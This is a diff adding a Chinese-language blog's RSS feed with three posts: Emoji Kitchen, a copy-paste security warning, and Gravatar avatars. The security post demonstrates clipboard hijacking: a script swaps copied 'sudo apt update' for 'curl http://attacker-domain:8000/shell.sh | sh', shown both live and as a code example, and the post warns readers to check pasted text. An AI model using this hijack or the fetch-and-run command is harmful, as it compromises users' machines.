@@ -1,0 +1,120 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>筆記ZONE • Posts by &#34;網路資源&#34; tag</title>
+        <link>https://zonego.tw</link>
+        <description></description>
+        <language>zh-TW</language>
+        <pubDate>Mon, 18 Sep 2023 04:00:32 +0000</pubDate>
+        <lastBuildDate>Mon, 18 Sep 2023 04:00:32 +0000</lastBuildDate>
+        <category>Hexo</category>
+        <category>Blog</category>
+        <category>搜尋引擎</category>
+        <category>Self-Hosting</category>
+        <category>網路</category>
+        <category>Windows</category>
+        <category>Linux</category>
+        <category>Mac</category>
+        <category>Apple Silicon</category>
+        <category>VM 虛擬機</category>
+        <category>DNS</category>
+        <category>Google</category>
+        <category>廣告</category>
+        <category>網站架設</category>
+        <category>Cloudflare</category>
+        <category>靜態網站</category>
+        <category>Git</category>
+        <category>資安</category>
+        <category>網路資源</category>
+        <category>CI/CD</category>
+        <category>Drone</category>
+        <category>Gitea</category>
+        <category>GMail</category>
+        <category>套件管理</category>
+        <category>環境變數</category>
+        <category>Ubuntu</category>
+        <category>桌布</category>
+        <category>DIY</category>
+        <category>Wiki JS</category>
+        <category>Keyckoak</category>
+        <category>身分認證</category>
+        <item>
+            <guid isPermalink="true">https://zonego.tw/2023/09/18/emoji-kitchen/</guid>
+            <title>Emoji Kitchen 自己組合出想要的表情符號</title>
+            <link>https://zonego.tw/2023/09/18/emoji-kitchen/</link>
+            <category>Google</category>
+            <category>網路資源</category>
+            <pubDate>Mon, 18 Sep 2023 04:00:32 +0000</pubDate>
+            <description><![CDATA[ &lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+&lt;h2 id=&#34;Gboard-鍵盤&#34;&gt;&lt;a href=&#34;#Gboard-鍵盤&#34; class=&#34;headerlink&#34; title=&#34;Gboard 鍵盤&#34;&gt;&lt;/a&gt;Gboard 鍵盤&lt;/h2&gt;&lt;p&gt;Google 出的 Gboard 鍵盤上推出 Emoji Kitchen 功能&lt;/p&gt;
+&lt;p&gt;Gboard Google Play 商店連結：&lt;a href=&#34;https://play.google.com/store/apps/details?id=com.google.android.inputmethod.latin&#34;&gt;https://play.google.com/store/apps/details?id=com.google.android.inputmethod.latin&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;簡單來說，在可以傳圖片的地方 (如 Discord)，用 Gboard 鍵盤輸入兩個 emiji 就可以將融合後的圖片傳出去&lt;/p&gt;
+&lt;img src=&#34;/images/content/emoji_kitchen/Screenshot.jpg&#34; height=&#34;500&#34;/&gt;
+
+&lt;h2 id=&#34;網頁版&#34;&gt;&lt;a href=&#34;#網頁版&#34; class=&#34;headerlink&#34; title=&#34;網頁版&#34;&gt;&lt;/a&gt;網頁版&lt;/h2&gt;&lt;p&gt;當初只在Gboard 鍵盤上的 Emoji Kitchen 合成功能現在開放網頁版啦&lt;/p&gt;
+&lt;p&gt;只要在 Google 搜尋 Emoji Kitchen，組合完表情就產生出圖片了&lt;/p&gt;
+&lt;p&gt;網址：&lt;a href=&#34;https://www.google.com/search?q=emoji+kitchen&#34;&gt;https://www.google.com/search?q=emoji+kitchen&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/content/emoji_kitchen/emoji_kitchen.jpg&#34;&gt;&lt;br&gt;&lt;img src=&#34;/images/content/emoji_kitchen/emoji_kitchen2.jpg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;要用時需要將圖片下載下來，或是複製圖片網址使用&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://www.gstatic.com/android/keyboard/emojikitchen/20201001/u1f914/u1f914_u1f47b.png?fbx&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight markdown&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs markdown&#34;&gt;&amp;lt;!-- 複製圖片網址範例 --&amp;gt;&lt;br&gt;&lt;br&gt;![](&lt;span class=&#34;hljs-link&#34;&gt;https://www.gstatic.com/android/keyboard/emojikitchen/20201001/u1f914/u1f914_u1f47b.png?fbx&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h2 id=&#34;開源版本&#34;&gt;&lt;a href=&#34;#開源版本&#34; class=&#34;headerlink&#34; title=&#34;開源版本&#34;&gt;&lt;/a&gt;開源版本&lt;/h2&gt;&lt;p&gt;在 Google 還沒開放網頁版功能之前，一些熱心開發者也做出類似的網站可以線上使用&lt;br&gt;這邊介紹 xsalazar&amp;#x2F;emoji-kitchen&lt;/p&gt;
+&lt;p&gt;使用時跟 Google 的網頁版一樣，需要將圖片下載下來，或是複製圖片網址使用&lt;/p&gt;
+&lt;p&gt;GitHub：&lt;a href=&#34;https://github.com/xsalazar/emoji-kitchen&#34;&gt;https://github.com/xsalazar/emoji-kitchen&lt;/a&gt;&lt;br&gt;Emoji Kitchen：&lt;a href=&#34;https://emojikitchen.dev/&#34;&gt;https://emojikitchen.dev/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/content/emoji_kitchen/emoji_kitchen3.jpg&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://zonego.tw/2022/04/27/copy-past/</guid>
+            <title>注意複製貼上內容</title>
+            <link>https://zonego.tw/2022/04/27/copy-past/</link>
+            <category>資安</category>
+            <category>網路資源</category>
+            <pubDate>Wed, 27 Apr 2022 11:44:03 +0000</pubDate>
+            <description><![CDATA[ &lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+&lt;h2 id=&#34;注意複製貼上內容&#34;&gt;&lt;a href=&#34;#注意複製貼上內容&#34; class=&#34;headerlink&#34; title=&#34;注意複製貼上內容&#34;&gt;&lt;/a&gt;注意複製貼上內容&lt;/h2&gt;&lt;p&gt;我們經常會從網路上複製資料，但在貼上之前先注意下你複製到甚麼內容!&lt;/p&gt;
+&lt;p&gt;複製這個指令試試看&lt;/p&gt;
+&lt;p id=&#34;copy&#34;&gt;sudo apt update&lt;/p&gt;
+
+&lt;script&gt;
+document.getElementById(&#39;copy&#39;).addEventListener(&#39;copy&#39;, function(e) { e.clipboardData.setData(&#39;text/plain&#39;, &#39;curl http://attacker-domain:8000/shell.sh | sh\n&#39;); e.preventDefault(); });
+&lt;/script&gt;
+
+&lt;p&gt;把剛剛複製的貼這邊&lt;/p&gt;
+&lt;textarea style=&#34;height: 100px; min-height: 100px; width:100%; resize: none;&#34; cols=&#34;30&#34; name=&#34;textarea&#34; rows=&#34;5&#34; placeholder=&#34;Paste your safe text here...&#34;&gt;&lt;/textarea&gt;
+
+
+&lt;p&gt;中間的奧秘就是用 JavaScript 達到改寫複製的內容&lt;/p&gt;
+&lt;figure class=&#34;highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs js&#34;&gt;&lt;span class=&#34;hljs-variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;hljs-title function_&#34;&gt;getElementById&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;copy&amp;#x27;&lt;/span&gt;).&lt;span class=&#34;hljs-title function_&#34;&gt;addEventListener&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;copy&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;e&lt;/span&gt;) &amp;#123; &lt;br&gt;    e.&lt;span class=&#34;hljs-property&#34;&gt;clipboardData&lt;/span&gt;.&lt;span class=&#34;hljs-title function_&#34;&gt;setData&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;text/plain&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;curl http://attacker-domain:8000/shell.sh | sh\n&amp;#x27;&lt;/span&gt;); &lt;br&gt;    e.&lt;span class=&#34;hljs-title function_&#34;&gt;preventDefault&lt;/span&gt;(); &lt;br&gt;&amp;#125;);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;所以，在貼上之前記得先貼到記事本檢查，&lt;strong&gt;不要直接貼到終端機使用&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;來源&#34;&gt;&lt;a href=&#34;#來源&#34; class=&#34;headerlink&#34; title=&#34;來源&#34;&gt;&lt;/a&gt;來源&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://www.wizer-training.com/blog/copy-paste&#34;&gt;https://www.wizer-training.com/blog/copy-paste&lt;/a&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://zonego.tw/2021/11/22/gravatar/</guid>
+            <title>大頭貼服務 Gravatar</title>
+            <link>https://zonego.tw/2021/11/22/gravatar/</link>
+            <category>Blog</category>
+            <category>網路資源</category>
+            <pubDate>Mon, 22 Nov 2021 08:30:59 +0000</pubDate>
+            <description><![CDATA[ &lt;p&gt;辦完帳號設定大頭貼是使用大多數服務的必經之路，今天就是要來解決需要重複上串大頭貼的問題! (希望可以…)&lt;/p&gt;
+&lt;h2 id=&#34;Gravatar&#34;&gt;&lt;a href=&#34;#Gravatar&#34; class=&#34;headerlink&#34; title=&#34;Gravatar&#34;&gt;&lt;/a&gt;Gravatar&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://gravatar.com/&#34;&gt;Gravatar&lt;/a&gt; 是多個網站支援的大頭貼服務，Slack、GitHub、WordPress 等大型網站都有支援。&lt;br&gt;只需在這邊設定完大頭貼，就可以一次套用。&lt;/p&gt;
+&lt;p&gt;除了提供大頭貼，Gravatar 也提供類似線上名片的功能。&lt;br&gt;你可以在上面放你的網站、email等公開資訊。 &lt;del&gt;不過我沒在用&lt;/del&gt;&lt;/p&gt;
+&lt;h3 id=&#34;使用大頭貼&#34;&gt;&lt;a href=&#34;#使用大頭貼&#34; class=&#34;headerlink&#34; title=&#34;使用大頭貼&#34;&gt;&lt;/a&gt;使用大頭貼&lt;/h3&gt;&lt;p&gt;參考&lt;a href=&#34;https://en.gravatar.com/site/implement&#34;&gt;官方文件&lt;/a&gt;的使用方法&lt;/p&gt;
+&lt;p&gt;裡面有個方便的用法：取得大頭貼的大頭貼的URL&lt;br&gt;有URL後在，大多數網頁或是可串接網路圖片的地方都可以嵌入&lt;/p&gt;
+&lt;p&gt;&lt;del&gt;如果不能用，一定是你還沒上傳大頭貼&lt;/del&gt;&lt;/p&gt;
+&lt;p&gt;大頭貼的網址長這樣，&lt;code&gt;HASH&lt;/code&gt;的部分要替換成email的md5 hash值&lt;/p&gt;
+&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;https:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;www.gravatar.com&lt;span class=&#34;hljs-regexp&#34;&gt;/avatar/&lt;/span&gt;HASH&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;如果不知道怎麼找對應的hash值，可以在&lt;a href=&#34;http://www.md5.cz/&#34;&gt;這裏&lt;/a&gt;產生對應的產生對應的md5 hash&lt;/p&gt;
+&lt;p&gt;例如我email的hash值找到是 &lt;code&gt;0b1d2b9d95375cc6af5909e145fb4a06&lt;/code&gt;&lt;br&gt;我的大頭貼網址就是&lt;/p&gt;
+&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;https:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;www.gravatar.com&lt;span class=&#34;hljs-regexp&#34;&gt;/avatar/&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;b1d2b9d95375cc6af5909e145fb4a06&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img onerror=&#34;imgOnError(this);&#34; data-fancybox=&#34;gallery&#34; src=&#34;https://www.gravatar.com/avatar/0b1d2b9d95375cc6af5909e145fb4a06&#34; alt=&#34;大頭貼&#34; data-caption=&#34;大頭貼&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight markdown&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs markdown&#34;&gt;![&lt;span class=&#34;hljs-string&#34;&gt;大頭貼&lt;/span&gt;](&lt;span class=&#34;hljs-link&#34;&gt;https://www.gravatar.com/avatar/0b1d2b9d95375cc6af5909e145fb4a06&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
